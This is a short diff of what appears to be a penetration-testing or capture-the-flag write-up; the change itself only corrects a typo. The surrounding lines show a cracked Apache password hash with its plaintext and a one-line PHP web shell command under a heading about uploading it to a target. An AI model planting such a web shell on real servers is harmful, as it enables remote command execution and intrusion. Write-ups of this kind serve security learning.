@@ -215,7 +215,7 @@ $apr1$8rO7Smi4$yqn7H.GvJFtsTou1a7VME0:babygurl69
 
 ### Uploading a webshell to the target
 
-We will create a webshell in a file named shell.php (A web shell was a good excuse to test the following ppython script)
+We will create a webshell in a file named shell.php (A web shell was a good excuse to test the following python script)
 
 ```
 echo '<?php system($_GET["cmd"]); ?>' > shell.php
